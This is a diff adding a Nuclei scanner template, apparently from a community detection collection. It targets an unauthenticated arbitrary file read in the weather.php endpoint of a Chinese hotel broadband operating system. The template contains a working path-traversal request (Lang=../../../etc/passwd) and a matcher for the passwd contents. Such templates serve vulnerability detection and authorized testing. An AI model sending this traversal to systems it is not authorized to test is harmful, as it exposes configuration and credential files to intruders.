@@ -1,0 +1,31 @@
+id: amtt-hiboss-weather-fileread
+info:
+  name: 安美数字酒店宽带运营系统 weather.php - fileread
+  author: leadlife
+  severity: high
+  description: 安美数字酒店宽带运营系统 weather.php 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+  reference: 
+    - demo
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+  tags: amtt,fileread
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/user/weather.php?Lang=../../../etc/passwd"
+
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+
+      - type: status
+        status:
+          - 200
